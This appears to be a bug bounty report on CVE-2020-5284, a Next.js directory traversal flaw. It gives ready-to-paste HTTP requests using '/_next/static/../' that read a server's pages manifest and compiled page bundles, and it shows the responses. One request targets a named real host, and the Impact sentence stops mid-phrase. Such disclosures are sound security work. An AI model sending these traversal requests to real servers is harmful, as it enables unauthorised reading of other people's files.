
# Directory traversal allows arbitrary file read (CVE-2020-5284)


## Summary
Next.js (versions before 9.3.2) have a directory traversal vulnerability. Using crafted requests, is possible to access files in the dist directory (.next). 

## Affected assets 

 - $DOMAIN

## Steps To Reproduce

Copy and paste the requests in Burp.

1.  Checking for vulnerability
```
GET /_next/static/../server/pages-manifest.json HTTP/1.1
Host: info.binance.com
Connection: close
Accept: */*
Accept-Language: en
Connection: close
Content-Length: 0
```
Response
```
HTTP/1.1 200 OK
Content-Type: application/json; charset=UTF-8
... (TRUNCATED)

{"/_app":"bundles/pages/_app.js",
"/_document":"bundles/pages/_document.js",
"/_error":"bundles/pages/_error.js",
"/info-add-edit":"bundles/pages/info-add-edit.js",
"/info-add-news":"bundles/pages/info-add-news.js",
"/info-all":"bundles/pages/info-all.js",
"/info-app-download":"bundles/pages/info-app-download.js",
"/info-detail":"bundles/pages/info-detail.js",
"/info-edit-ico":"bundles/pages/info-edit-ico.js",
"/info-edit-teams":"bundles/pages/info-edit-teams.js",
"/info-edit-vcs":"bundles/pages/info-edit-vcs.js",
"/info-news-detail":"bundles/pages/info-news-detail.js",
"/info":"bundles/pages/info.js",
"/organization":"bundles/pages/organization.js",
"/rate-list":"bundles/pages/rate-list.js",
"/rate-report":"bundles/pages/rate-report.js",
"/rating-detail":"bundles/pages/rating-detail.js",
"/research":"bundles/pages/research.js"}
```
Now that we have confirmed the vulnerability, we can read the files shown on the last request

```
GET /_next/static/../bundles/pages/info-app-download.js HTTP/1.1
Host: REDACTED
Connection: close
Accept: */*
Accept-Language: en
Connection: close
Content-Length: 0


```
Response (trunked)
```
HTTP/1.1 200 OK
Content-Type: application/javascript; charset=UTF-8
Content-Length: 8002
Connection: close
Date: Sat, 03 Oct 2020 07:37:10 GMT
Server: Tengine
Vary: Accept-Encoding
Accept-Ranges: bytes
Cache-Control: public, max-age=0
Last-Modified: Mon, 07 Sep 2020 10:09:28 GMT
ETag: W/"1f42-174680abbc0"
Vary: Accept-Encoding
X-Frame-Options: SAMEORIGIN
X-Xss-Protection: 1; mode=block
X-Content-Type-Options: nosniff
Referrer-Policy: origin-when-cross-origin
Strict-Transport-Security: max-age=31536000; includeSubdomains
X-Cache: Miss from cloudfront
Via: 1.1 REDACTED.cloudfront.net (CloudFront)
X-Amz-Cf-Pop: SCL50-C1
X-Amz-Cf-Id: k-RepQTs_VcGfZ9Aug9ALHfu5CBFb_x0LXMk7CLqFic6JRDbCGwtlQ==

module.exports=__NEXT_REGISTER_PAGE("/info-app-download",function(){return{page:webpackJsonp([21],{1257:function(e,t,n){e.exports=n(1258)},1258:function(e,t,n){"use strict";Object.defineProperty(t,"__esModule",{value:!0});n(4),n(200),n(23);var o=n(15),a=n.n(o),i=n(1),r=n.n(i),l=n(18),c=(n(2),n(3)),s=n(9),m=n(176),u=n(182),p=n(14),d=n(22),f=n.n(d),h=(n(24),n(35)),g=n.n(h),b=n(183);function w(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{},o=Object.keys(n);"function"==typeof Object.getOwnPropertySymbols&&(o=o.concat(Object.getOwnPropertySymbols(n).filter(function(e){return Object.getOwnPropertyDescriptor(n,e).enumerable}))),o.forEach(function(t){y(e,t,n[t])}
```
 
The response above is the content of the file info-app-download.js, you can repeat the same process for every file included in the pages-manifest.json (first request/response)




## Impact
It's possible to read  all the files described in the pages-manifest.json files. This violates the principle of 

### Supporting Material/References:
[NVD](https://nvd.nist.gov/vuln/detail/CVE-2020-5284)


